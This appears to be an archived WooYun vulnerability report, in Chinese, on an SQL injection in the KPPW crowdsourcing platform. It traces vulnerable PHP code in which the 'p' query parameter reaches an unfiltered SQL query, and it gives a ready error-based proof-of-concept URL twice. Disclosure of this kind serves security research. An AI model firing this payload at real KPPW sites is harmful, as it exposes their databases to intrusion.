{"id": 43558, "wybug_id": "wooyun-2014-082389", "wybug_title": "KPPW系统sql注入-2", "wybug_corp": "kppw", "wybug_author": "路人甲", "wybug_date": "2014-11-07 16:37", "wybug_open_date": "2015-02-05 16:38", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KPPW是客客团队主打的开源威客系统，同类开源建站产品的领跑者，搭建无物流电子商务在线服务交易平台的首选系统。2014年6月新版KPPW2.5发布了，新版借助客客团队近4年来威客行业的开源产品和商业项目的成熟经验，对前端功能进行了深入改进。KPPW从产品规划、UI设计、程序开发多个环节进行了优化，在未做框架重构情况下对程序进行更优秀的改进。  详细说明：  \n$_R and extract ( $_R, EXTR_SKIP );\n首先是将所有的request参数都释放成变量，但不覆盖已经存在的再看index.php中：\nif(intval($u)){\tif(!isset ( $_COOKIE ['prom'] )){\t\t$objProm = keke_prom_class::get_instance ();\t\t$objProm->create_prom_cookie ( $_SERVER ['QUERY_STRING'] );\t}}\n$u 可以通过get请求传入，进入$objProm->create_prom_cookie ( $_SERVER ['QUERY_STRING'] );\nfunction create_prom_cookie($query_string) {\t\tglobal $uid, $username;\t\tglobal $_lang;\t\t$url_data = $this->url_data_format ( $query_string );\t\tif ($uid) { \t\t\tif ($url_data ['u'] != $uid && $url_data ['p']) {\t\t\t\tif (! $this->get_prom_relation ( $uid, $url_data ['p'] )) { \t\t\t\t\t$this->create_prom_relation ( $uid, $username, $url_data, 2 );\t\t\t\t}\t\t\t}\t\t} else { \t\t\tsetcookie ( \"prom\", serialize ( $url_data ), time () + 24 * 3600, COOKIE_PATH, COOKIE_DOMAIN, NULL, TRUE );\t\t}\t}public function url_data_format($query_string) {\t\t$format_data = array ();\t\tparse_str ( $query_string, $format_data );\t\t$format_data ['p'] and $format_data ['p'] = $format_data ['p'] or $format_data ['p'] = 'reg';\t\treturn $format_data;\t}\n在这里 $url_data 由$_SERVER['QUERY_STRING'] 转换后得到。而$url_data['p']实际上就是get参数中的p，在这里需要普通用户登录下，进入到$this->get_prom_relation ( $uid, $url_data ['p'] )方法最后再看get_prom_relation的方法：\npublic function get_prom_relation($uid, $prom_type) {\t\t$sql = \" select * from %switkey_prom_relation where uid='%d' and prom_type='%s'\";\t\t$p_relation = db_factory::get_one ( sprintf ( $sql, TABLEPRE, $uid, $prom_type ) );\t\tif (! $p_relation) { \t\t\t$p_relation or $p_relation = db_factory::get_one ( sprintf ( $sql, TABLEPRE, $uid, 'reg' ) );\t\t\t$reg_event = $this->get_prom_event ( $uid, $uid, 'reg' ); \t\t\t$reg_event and $p_relation ['relation_status'] = 4; \t\t}\t\tif ($this->_prom_period && $p_relation) { \t\t\t$valid_time = time () - $p_relation ['on_time'] - $this->_prom_period * 24 * 3600;\t\t\t$valid_time > 0 and $this->set_relation_status ( $p_relation ['relation_id'], 3 ); \t\t}\t\treturn $p_relation;\t}\n这里直接将$prom_type带入到了数据库sql语句中执行，并没有做任何过滤。poc: /KPPW_UTF/index.php?p=a%27%20and%20%28UpdateXML%281%2CCONCAT%280x5b%2Cuser%28%29%2C0x5d%29%2C1%29%29%23&u=1  (需要登录，报错法）\n\n   漏洞证明：  poc: /KPPW_UTF/index.php?p=a%27%20and%20%28UpdateXML%281%2CCONCAT%280x5b%2Cuser%28%29%2C0x5d%29%2C1%29%29%23&u=1  (需要登录，报错法）\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}